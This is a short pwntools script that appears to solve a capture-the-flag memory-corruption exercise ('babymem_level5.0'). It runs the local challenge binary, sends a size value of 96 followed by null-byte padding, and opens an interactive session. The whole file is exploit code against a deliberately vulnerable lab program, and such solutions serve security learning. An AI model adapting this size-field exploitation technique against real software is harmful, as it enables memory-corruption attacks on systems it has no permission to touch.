from pwn import *

p = process("/challenge/babymem_level5.0")

num = 96
payload = bytes(str(num), 'ascii')

payload += b'\x00'*16

p.sendline(payload)
p.interactive()
